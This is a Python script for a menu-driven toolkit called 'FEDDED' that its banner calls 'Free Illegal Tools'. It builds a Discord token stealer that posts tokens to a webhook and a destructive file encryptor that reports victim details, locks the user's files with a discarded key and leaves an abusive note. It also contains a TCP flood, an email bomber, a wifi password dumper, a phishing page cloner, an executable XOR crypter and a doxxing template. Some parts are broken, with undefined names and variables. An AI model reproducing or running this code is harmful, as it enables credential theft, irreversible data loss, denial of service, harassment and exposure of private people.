import os
import hashlib
import socket
import threading
import random
import string
import base64
import requests
import time
import sys
import subprocess
import smtplib
from email.mime.text import MIMEText
import re
from cryptography.fernet import Fernet

from colorama import Fore, Style

fedbanner = f"""{Fore.BLUE}
                      _____          .___                  .__  .__                  .___
                    _/ ____\____   __| _/________________  |  | |__| ______ ____   __| _/
                    \   __\/ __ \ / __ |/ __ \_  __ \__  \ |  | |  |/  ___// __ \ / __ | 
                     |  | \  ___// /_/ \  ___/|  | \// __ \|  |_|  |\___ \\  ___// /_/ | 
                     |__|  \___  >____ |\___  >__|  (____  /____/__/____  >\___  >____ | 
                               \/     \/    \/           \/             \/     \/     \/
                                        Developed by @rp9y on Discord
                                Bunch of Free Illegal Tools with no real logic

==========================================================================================================
GENERATORS			ATTACKS		          CRYPTERS                    CHECKERS     
==========================================================================================================
[1] Token Logger		[5] IP DoS		  [9] Base64      	      [11] Bitcoin Balance 
[2] Encrypterware		[6] Phish		  [10] XOR Crypter
[3] Password			[7] Email Bomb			   
[4] Dox Paste			[8] Wifi Pass Log

==========================================================================================================
"""

def phishpage():
    url = input(f"{Fore.BLUE}FEDDED - Enter Target URL >> ").strip()

    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()

        parsed_url = urlparse(url)
        domain = parsed_url.netloc.replace("www.", "")
        filename = f"{domain}.html"

        script_dir = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(script_dir, filename)

        with open(file_path, "w", encoding="utf-8") as file:
            file.write(response.text)

        print(f"{Fore.BLUE}Page HTML saved successfully as: {filename}")

    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Error retrieving the website.")
        print(e)

def tklbuild():
    tklwebhookurl = input(f"{Fore.BLUE}FEDDED - Enter Your Webhook >> ")
    tklcode = f'''import os,re,requests
tklwebhookurl="{tklwebhookurl}"
for p in [os.getenv("APPDATA")+"\\\\discord\\\\Local Storage\\\\leveldb",
          os.getenv("APPDATA")+"\\\\discordcanary\\\\Local Storage\\\\leveldb",
          os.getenv("APPDATA")+"\\\\discordptb\\\\Local Storage\\\\leveldb"]:
    if os.path.exists(p):
        for f in os.listdir(p):
            if f.endswith((".log",".ldb")):
                for t in re.findall(r"[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}|mfa\\.[\\w-]{{84}}", open(p+"\\\\"+f,errors="ignore").read()):
                    requests.post(tklwebhookurl,json={{"content":t}})'''
    open("FEDDED_TOKENLOGGER.py","w").write(tklcode)
    print(f"{Fore.BLUE}Token Logger created as FEDDED_TOKENLOGGER.py")

def dos_flood():
    print(f"{Fore.BLUE}========================================================")
    print(f"{Fore.BLUE}This does not mask IP's or connect to proxies. Cautious.")
    print(f"{Fore.BLUE}========================================================")
    ip = input(f"{Fore.BLUE}Target IP: ")
    port = int(input(f"{Fore.BLUE}Port: "))
    threads = int(input(f"{Fore.BLUE}Threads: "))
    def flood():
        while True:
            try:
                s = socket.socket()
                s.connect((ip, port))
                s.send(b"X"*9999)
                s.close()
            except: pass
    for _ in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    print(f"{Fore.BLUE}Flooding...")
    time.sleep(99999)

def base64_ed():
    mode = input(f"{Fore.BLUE}FEDDED - Would you like to encode or decode (e/d) >> ")
    data = input(f"{Fore.BLUE}FEDDED - Paste your data to encode >> ")
    if mode == "e":
        print(base64.b64encode(data.encode()).decode())
    else:
        print(base64.b64decode(data).decode())

def wifi_grabber():
    try:
        profiles = re.findall(r"All User Profile\s+:\s+(.*)", subprocess.check_output("netsh wlan show profiles", shell=True).decode(errors="ignore"))
        for profile in profiles:
            res = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', shell=True).decode(errors="ignore")
            key = re.search(r"Key Content\s+:\s+(.*)", res)
            print(f"{Fore.BLUE}{profile}: {key.group(1) if key else 'None'}")
    except:
        print(f"{Fore.BLUE}Windows + admin only")

def email_bomber():
    email = input(f"{Fore.BLUE}FEDDED - Your E-Mail >> ")
    pwd = input(f"{Fore.BLUE}FEDDED - Your E-Mail Password >> ")
    target = input(f"{Fore.BLUE}FEDDED - Enter Victim's E-Mail: ")
    subj = input(f"{Fore.BLUE}FEDDED - Enter Subject: ")
    body = input(f"{Fore.BLUE}FEDDED - Enter Message Body >>  ")
    count = int(input(f"{Fore.BLUE}FEDDED - Enter Message Count >> "))
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, pwd)
    msg = MIMEText(body)
    msg["Subject"] = subj
    for i in range(count):
        server.sendmail(email, target, msg.as_string())
        print(f"{Fore.BLUE}E-Mail {i+1} Sent")

def btc_checker():
    addr = input(f"{Fore.BLUE}FEDDED - Enter BTC address >> ")
    try:
        data = requests.get(f"https://blockchain.info/rawaddr/{addr}").json()
        print(f"{Fore.BLUE}Balance: {data['final_balance']/100000000} BTC" + RESET)
    except:
        print(f"{Fore.RED}Invalid Bitcoin Address")

def dox_builder():
    doxreason = input(f"{Fore.BLUE}FEDDED - Reason >> ")
    doxer = input(f"{Fore.BLUE}FEDDED - Doxed By >> ")
    print(f"{Fore.BLUE}=========================================")
    continent = input(f"{Fore.BLUE}FEDDED - Continent >> ")
    city = input(f"{Fore.BLUE}FEDDED - City >> ")
    street = input(f"{Fore.BLUE}FEDDED - Street >> ")
    address = input(f"{Fore.BLUE}FEDDED - Full Address >> ")
    print(f"{Fore.BLUE}=========================================")
    firstname = input(f"{Fore.BLUE}FEDDED - First Name >> ")
    lastname = input(f"{Fore.BLUE}FEDDED - Last Name >> ")
    age = input(f"{Fore.BLUE}FEDDED - Age >> ")
    birthday = input(f"{Fore.BLUE}FEDDED - Date of Birth >> ")
    print(f"{Fore.BLUE}=========================================")
    momname = input(f"{Fore.BLUE}FEDDED - Mother's Name >> ")
    dadname = input(f"{Fore.BLUE}FEDDED - Father's Name >> ")
    sisname = input(f"{Fore.BLUE}FEDDED - Sister's Name >> ")
    broname = input(f"{Fore.BLUE}FEDDED - Brother's Name >> ")
    print(f"{Fore.BLUE}=========================================")
    exitmsg = input(f"{Fore.BLUE}FEDDED - Your Exit Message >> ")
    doxpaste = f'''
  _____          .___  .___         .___     .___            
_/ ____\____   __| _/__| _/____   __| _/   __| _/_______  ___   TEMPLATE BY FEDERALISED TOOL
\   __\/ __ \ / __ |/ __ |/ __ \ / __ |   / __ |/  _ \  \/  /
 |  | \  ___// /_/ / /_/ \  ___// /_/ |  / /_/ (  <_> >    <        Reason: {doxreason}
 |__|  \___  >____ \____ |\___  >____ |  \____ |\____/__/\_ \       Doxed By: {doxer}
           \/     \/    \/    \/     \/       \/           \/

===================
Home/Location======
===================
Continent: {continent}
Country: {country}
City: {city}
Street: {street}
Full Address: {address}

===================
Personal===========
===================
First Name: {firstname}
Last Name: {lastname}
Age: {age}
D.O.B.: {birthday}

===================
Family=============
===================
Mother: {momname}
Father: {dadname}
Sister: {sisname}
Brother: {broname}



{exitmsg}

==========================
==========================
====THE END OF THE DOX====
==========================
=========================='''
    open("FEDDED_DOXPASTE.txt", "w").write(doxpaste)
    print(f"{Fore.BLUE}Dox Paste created as FEDDED_DOXPASTE.txt")

def pass_gen():
    length = int(input(f"{Fore.BLUE}FEDDED - Enter Password Length >> "))
    chars = string.ascii_letters + string.digits + "abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*"
    password = "".join(random.choice(chars) for _ in range(length))
    print(f"{Fore.BLUE}{password}")

def xor_crypter():
    file = input(f"{Fore.BLUE}FEDDED - Enter Payload .exe >> ")
    key = random.randint(1, 255)
    data = open(file, "rb").read()
    enc = bytes(b ^ key for b in data)
    open("crypted.exe", "wb").write(enc)
    print(f"{Fore.BLUE}Crypted with the key {key}")

def encryptware_gen():
    encrypter_webhook_url = input(f"{Fore.BLUE}FEDDED - Enter Webhook URL >> ")
    encryptware_code = f'''\
# -*- coding: utf-8 -*-
import os
import platform
import socket
import getpass
import requests
from pathlib import Path
from cryptography.fernet import Fernet

WEBHOOK_URL = "{encrypter_webhook_url}"

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org").text.strip()
    except:
        return "Unknown"

def collect_info():
    info = {{
        "username": getpass.getuser(),
        "hostname": socket.gethostname(),
        "os": platform.system() + " " + platform.release(),
        "public_ip": get_public_ip(),
        "platform": platform.platform()
    }}
    return info

def send_to_discord(data):
    payload = {{"content": "**TOTAL DESTRUCTION COMPLETE**\\nVictim data:\\n```json\\n{{}}```".format(str(data))}}
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except:
        pass

def generate_key():
    return Fernet.generate_key()

def encrypt_file(file_path, key):
    fernet = Fernet(key)
    try:
        # Skip if already encrypted or too small
        if file_path.suffix.lower() == ".locked" or os.path.getsize(file_path) == 0:
            return
        with open(file_path, "rb") as f:
            data = f.read()
        encrypted = fernet.encrypt(data)
        with open(file_path, "wb") as f:
            f.write(encrypted)
        os.rename(file_path, str(file_path) + ".locked")
    except Exception:
        pass

def leave_note():
    desktop = Path.home() / "Desktop"
    note_path = desktop / "EVERYTHING_IS_GONE.txt"
    note_content = """
Good job, sucker.

Your computer is done;
                Everything encrypted. Data, code, pictures, everything.

                All just because youre too idiotic to download code from a random person.

Have a great day you goddamn autist.

                                    -FEDERALISED ENCRYPTER
"""
    try:
        with open(note_path, "w", encoding="utf-8") as f:
            f.write(note_content)
    except:
        pass

def get_target_dirs():
    home = Path.home()
    targets = [
        home,
        home / "Desktop",
        home / "Documents",
        home / "Downloads",
        home / "Pictures",
        home / "Videos",
        home / "Music",
        home / "Movies",
        home / "Projects",
        home / "Code",
        home / "OneDrive",
        home / "Dropbox",
        home / "Google Drive",
        home / "AppData" / "Local",
        home / "AppData" / "Roaming"
    ]
    return [p for p in targets if p.exists()]

def encrypt_all():
    key = generate_key()  # Created once, used once, lost forever
    
    # Massive target extension list - code + personal files + everything valuable
    target_extensions = [
        # Source code & scripts
        '.py', '.pyc', '.pyw', '.js', '.jsx', '.ts', '.tsx', '.html', '.htm', '.css', '.scss', '.sass',
        '.c', '.cpp', '.cc', '.cxx', '.h', '.hpp', '.cs', '.java', '.class', '.go', '.rs', '.php',
        '.rb', '.pl', '.sh', '.bash', '.ps1', '.sql', '.yaml', '.yml', '.json', '.xml', '.toml',
        '.ini', '.cfg', '.config', '.vue', '.swift', '.kt', '.scala', '.dart', '.lua', '.r', '.ipynb',
        '.sol', '.tf', '.tfvars', '.dockerfile',
        
        # Documents & data
        '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.txt', '.rtf', '.odt', '.ods',
        '.csv', '.db', '.sqlite', '.mdb', '.accdb', '.bak', '.wallet', '.key', '.pem', '.crt',
        
        # Media
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg', '.mp3', '.wav', '.flac', '.mp4',
        '.avi', '.mkv', '.mov', '.wmv', '.webm',
        
        # Archives & backups
        '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.iso',
        
        # Other valuables
        '.psd', '.ai', '.indd', '.blend', '.dwg', '.sav', '.gdb'
    ]
    
    for directory in get_target_dirs():
        for root, _, files in os.walk(directory):
            for file in files:
                file_path = Path(root) / file
                if file_path.suffix.lower() in target_extensions:
                    if ".locked" not in str(file_path):
                        encrypt_file(file_path, key)

def main():
    victim_info = collect_info()
    send_to_discord(victim_info)
    encrypt_all()
    leave_note()

if __name__ == "__main__":
    main()
'''
    open("FEDDED_ENCRYPTER.py", "w").write(encryptware_code)
    print("{Fore.BLUE}Your encrypter has been created.")

def main():
    print(fedbanner)
    while True:
        basicoption = input(f"{Fore.BLUE}FEDDED - Choose your Tool >> ")

        # Generators Choices
        if basicoption == '1':
            tklbuild()
        elif basicoption == '2':
            encryptware_gen()
        elif basicoption == '3':
            pass_gen()
        elif basicoption == '4':
            dox_builder()

        # Attacks Choices
        elif basicoption == '5':
            dos_flood()
        elif basicoption == '6':
            phishpage()
        elif basicoption == '7':
            email_bomber()
        elif basicoption == '8':
            wifi_grabber()
        
        # Crypters Choices
        elif basicoption == '9':
            base64_ed()
        elif basicoption == '10':
            xor_crypter()

        # Checkers Choices
        elif basicoption == '11':
            btc_checker()
main()
